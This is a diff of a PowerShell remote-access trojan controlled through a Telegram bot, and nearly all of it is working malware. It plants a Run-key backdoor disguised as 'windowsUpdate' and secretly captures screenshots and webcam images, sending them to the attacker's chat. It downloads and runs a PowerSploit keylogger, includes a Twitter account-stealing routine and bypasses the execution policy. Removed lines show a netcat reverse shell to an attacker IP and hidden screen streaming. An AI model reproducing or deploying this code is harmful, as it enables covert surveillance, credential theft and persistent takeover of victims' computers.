@@ -73,10 +73,10 @@ function turnOffScreen {
 function backdoor {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
         
-        Send-Message "Downloading.."
+        Write-Host "Downloading backdoor.."
         Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
 
-        Send-Message "Adding_to_the_reg.."
+        Write-Host "Adding backdoor to the reg.."
 		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
 
         # Check backdoor
@@ -108,22 +108,12 @@ function screenshot {
 
 function cleanAll {
     # Remove screenshots
-    Send-Message "Deleting_screenshots.."
-    Remove-Item "C:\Users\$env:username\Documents\screenshot.jpg"
+    rm C:\Users\$env:username\Documents\screenshot.jpg
     # Remove cUrl
-    Send-Message "Deleting_cURL.."
-    Remove-Item -Recurse "C:\Users\$env:username\AppData\Local\Temp\1"
+    rm C:\Users\$env:username\AppData\Local\Temp\1
     # Remove backdoor
-    Send-Message "Deleting_backdoor.."
-    Remove-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1"
+    rm C:\Users\$env:username\Documents\windowsUpdate.ps1
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
-    # Remove webcam
-    Send-Message "Deleting_webcam.."
-    Remove-Item "C:\Users\$env:username\Documents\CommandCam.exe"
-    # Remove netcat
-    Send-Message "Deleting_netcat.."
-    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
-    Remove-Item "C:\Users\$env:username\Documents\nc.zip"
 }
 
 function installCurl {
@@ -146,24 +136,17 @@ function installCurl {
 }
 
 function sendPhoto {
-    Send-Message "Sending.."
+    Write-Host "Sending screenshot.."
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
+    Write-Host "Deleting screenshot.."
     Start-Sleep -Seconds 5
-    Send-Message "Deleting.."
     Remove-Item $photo
     #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
-}
-
-function Send-Message($message) {
-    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
-    $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
-    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 }
 
 function ipPublic {
@@ -181,140 +164,92 @@ function download($FileToDownload) {
     #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
 }
 
-function keylogger($seconds) {
-  # Requires -Version 2
-  # Signatures for API Calls
-  $signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
+function keylogger($time) {
+    Write-Host "Downloading keylogger.."
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')
+    $log = "C:\Users\$env:username\Documents\key.txt"
+    Start-Sleep -Seconds 2
 
-  $Path = "$env:temp\keylogger.txt"
-
-  # load signatures and make members available
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    Write-Host "Launching keylogger $time.."
+    Get-Keystrokes -LogPath $log -Timeout $time
     
-  # create output file
-  $null = New-Item -Path $Path -ItemType File -Force
+    Write-Host "Sending keystrokes.."
+    Start-Sleep -Seconds $time
+    download $log
 
-  try {
-    Write-Host 'Recording..'
-    Send-Message 'Recording..'
-
-    # create endless loop. When user presses CTRL+C, finally-block
-    # executes and shows the collected key presses
-    $timeout = new-timespan -Seconds  $time
-    $sw = [diagnostics.stopwatch]::StartNew()
-    while ($sw.elapsed -lt $timeout) {
-      Start-Sleep -Milliseconds 40
-      
-      # scan all ASCII codes above 8
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        # get current key state
-        $state = $API::GetAsyncKeyState($ascii)
-
-        # is key pressed?
-        if ($state -eq -32767) {
-          $null = [console]::CapsLock
-
-          # translate scan code to real code
-          $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-          # get keyboard state for virtual keys
-          $kbstate = New-Object Byte[] 256
-          $checkkbstate = $API::GetKeyboardState($kbstate)
-
-          # prepare a StringBuilder to receive input key
-          $mychar = New-Object -TypeName System.Text.StringBuilder
-
-          # translate virtual key
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-
-          if ($success) {
-            # add key to logger file
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
-          }
-        }
-      }
-    }
-  }
-
-  finally {
-    # open logger file in Notepad - Only for test
-    #notepad $Path
-
-    Write-Host "Downloading keylogger file.."
-    Send-Message 'Downloading..'
-    download $Path
-
+    Write-Host "Deleting log.."
     Start-Sleep -Seconds 5
-    Write-Host "Deleting keylogger file.."
-    Send-Message 'Deleting..'
-    Remove-Item $Path
-  }
+    Remove-Item $log
 }
 
 function webcam {
-    Send-Message "Downloading.."
+    Write-Host "Downloading CommandCam.."
     # https://batchloaf.wordpress.com/commandcam/
     $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
     $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $url -OutFile $outpath
 
-    Send-Message "Taking_picture.."
+    Write-Host "Taking picture.."
     $args = "/filename C:\Users\$env:username\Documents\image.jpg"
     Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
     Start-Sleep -Seconds 5
 
-    Send-Message "Sending_picture.."
+    Write-Host "Sending picture.."
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\image.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
+    Write-Host "Deleting picture.."
     Start-Sleep -Seconds 5
-    Send-Message "Deleting_picture.."
     Remove-Item $photo
     Remove-Item $outpath
 }
 
 function mainBrowser {
-    Send-Message "Checking_main_browser_on_the_reg.."
+    Write-Host "Checking main browser on the reg.."
     $mainBrowser = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice
 
     if ($mainBrowser -match 'chrome') {
-        Send-Message "Chrome!"
+        Write-Host "Chrome!"
         $chrome = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe"
         if(![System.IO.File]::Exists($chrome)){
             $chrome = "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe"
-            Send-Message "Chrome x64!"
+            Write-Host "Chrome x64!"
             return $chrome
         }
-        Send-Message "Chromex86!"
+        Write-Host "Chrome x86!"
         return $chrome
      }
 
     ElseIf ($mainBrowser -match 'Firefox') {
-        Send-Message "Firefox!"
+        Write-Host "Firefox!"
         $firefox = "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe"
         if(![System.IO.File]::Exists($firefox)){
             $firefox = "${env:ProgramFiles}\Mozilla Firefox\firefox.exe"
-            Send-Message "Firefox x64!"
+            Write-Host "Firefox x64!"
             return $firefox
         }
-        Send-Message "Firefoxx86!"
+        Write-Host "Firefox x86!"
         return $firefox
      }
 }
+
+<#
+function forceHackTwitter {
+    $mainBrowser = mainBrowser
+    Start-Process $mainBrowser -ArgumentList "https://twitter.com/login" -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+    $wshell = New-Object -ComObject wscript.shell; $wshell.AppActivate('Iniciar sesión en Twitter') 
+    Start-sleep -Seconds 10
+    $wshell.SendKeys("^{s}") 
+    $wshell.AppActivate('Guardar como')
+    Sleep -Seconds 2 
+    $wshell.SendKeys('~') 
+}
+#>
 
 function HackTwitterW10 {
     <#
@@ -519,66 +454,12 @@ public static void SwitchRightVirtualDesktopInWin10()
     Remove-Item "C:\Users\$env:username\Downloads\w_files.zip"
 }
 
-function netcat($ip) {
-    Send-Message "Downloading_netcat.."
-    $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
-    $outpath = "C:\Users\$env:username\Documents\nc.zip"
-    $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outpath
-    
-    Start-Sleep -Seconds 5
-    Expand-Archive $outpath -DestinationPath $outpathUnzip
-    $args = "$ip 8888 -e cmd.exe"
-    $netcat = $outpathUnzip+"\nc.exe"
-
-    Start-Sleep -Seconds 5
-    Send-Message "Connecting.."
-    Send-Message "IP:$ip"
-    Send-Message "Port:8888"
-    Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
-}
-
-function stopnetcat {
-    Send-Message "Stopping_netcat.."
-    taskkill /F /IM nc.exe
-    
-    Sleep -Seconds 5
-    Send-Message "Deleting_netcat.."
-    Remove-Item -Recurse "C:\Users\$env:username\Documents\nc"
-    Remove-Item "C:\Users\$env:username\Documents\nc.zip" 
-}
-
-function twitch($STREAM_KEY) {
-    Send-Message "Downloading_FFmpeg.."
-    $url = "https://ffmpeg.zeranoe.com/builds/win32/static/ffmpeg-20180828-26dc763-win32-static.zip"
-    $outpath = "C:\Users\$env:username\Documents\FFmpeg.zip"
-    $outpathUnzip  = "C:\Users\$env:username\Documents\FFmpeg"
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outpath
-
-    Send-Message "Starting_streaming.."
-    Start-Sleep -Seconds 5
-    Expand-Archive $outpath -DestinationPath $outpathUnzip
-    $FFmpeg = $outpathUnzip+"\ffmpeg-20180828-26dc763-win32-static\bin\ffmpeg.exe"
-    Start-Process -Filepath $FFmpeg "-f gdigrab -s 1920x1080 -framerate 15 -i desktop -c:v libx264 -preset fast -pix_fmt yuv420p -s 1280x800 -threads 0 -f flv rtmp://live-mad.twitch.tv/app/$STREAM_KEY" -windowstyle hidden
-}
-
-function stoptwitch {
-    Send-Message "Stopping twitch.."
-    taskkill /F /IM ffmpeg.exe
-    
-    Sleep -Seconds 5
-    Remove-Item -Recurse "C:\Users\$env:username\Documents\FFmpeg"
-    Remove-Item "C:\Users\$env:username\Documents\FFmpeg.zip"
-}
-
 
 #####################
 ## BYPASS POLICIES ##
 #####################
 
-# Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
 
 
 ##########################
@@ -725,21 +606,7 @@ While ($DoNotExit)  {
       }
       "/keylogger $ipV4 *"{
         $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
-        keylogger seconds $time
-      }
-      "/nc $ipV4 *"{
-        $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
-        netcat $ip
-      }
-      "/stopnc $ipV4"{
-        stopnetcat
-      }
-      "/starttwitch $ipV4 *"{
-        $STREAM_KEY = ($LastMessageText -split ("/twitch $ipV4 "))[1]
-        twitch $STREAM_KEY
-      }
-      "/stoptwitch $ipV4"{
-        stoptwitch
+        Keylogger $time
       }
 	  default  {
 	    #The message sent is unknown
